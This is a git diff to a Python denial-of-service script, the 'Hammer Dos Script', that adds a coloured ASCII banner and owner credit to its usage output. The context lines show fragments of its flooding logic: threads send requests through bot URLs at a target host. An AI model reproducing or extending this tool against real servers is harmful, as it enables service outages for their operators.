@@ -73,9 +73,20 @@ def dos2():
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
 
+logo = ("""\033[1;92m   
+  ██   ██  █████  ███████  █████  ███    ██
+  ██   ██ ██   ██ ██      ██   ██ ████   ██
+  ███████ ███████ ███████ ███████ ██ ██  ██
+  ██   ██ ██   ██      ██ ██   ██ ██  ██ ██
+  ██   ██ ██   ██ ███████ ██   ██ ██   ████  \033[1;90m●  \033[1;95m0.0.2
+
+\033[1;93m ۝࿐\033[1;97m════════════════════════════════════════\033[1;93m࿐۝
+      \033[1;92m OWNER  \033[1;93m: \033[1;92m ASRAFUL ISLAM HASAN
+\033[1;93m ۝࿐\033[1;97m════════════════════════════════════════\033[1;93m࿐۝""")
 
 def usage():
-	print("\033[1;93m Bangladesh Hacker Hasan Islam ")
+	print(logo)
+	print(''' Bangladesh Hacker Hasan Islam ''')
 	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
 	It is the end user's responsibility to obey all applicable laws.
 	It is just for server testing script. Your ip is visible. \n
@@ -162,3 +173,4 @@ if __name__ == '__main__':
 			w.put(item)
 		q.join()
 		w.join()
+	
